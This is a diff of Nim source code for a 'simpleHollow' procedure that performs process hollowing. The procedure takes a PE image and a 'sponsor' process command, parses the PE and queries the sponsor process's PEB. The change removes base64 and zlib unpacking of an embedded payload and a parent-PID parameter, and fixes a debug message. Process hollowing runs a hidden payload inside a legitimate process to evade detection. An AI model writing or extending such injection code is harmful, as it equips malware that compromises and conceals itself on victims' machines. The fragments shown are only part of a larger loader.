@@ -1,16 +1,10 @@
-import utils
 import winim
 import ptr_math
 import std/strutils
-from zip/zlib import uncompress
 
 
-proc simpleHollow*(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0): bool =
+proc simpleHollow*(peStr: string, sponsorCmd: LPCSTR): bool =
 
-    # Decode and decompress PE
-    var compressedPe = decode64(compressedBase64PE, is_bin=true)
-    var peStr = uncompress(compressedPe)
-    
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
     var peBytesPtr = addr peBytes[0]
@@ -60,7 +54,7 @@ proc simpleHollow*(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
         cast[windef.ULONG](sizeof(bi)),
         addr ret
     ) != 0:
-        when not defined(release): echo "[-] Could query sponsor process"   
+        when not defined(release): echo "[-] Could not query sponsor process"   
         quit()
     
     let sponsorPeb = bi.PebBaseAddress
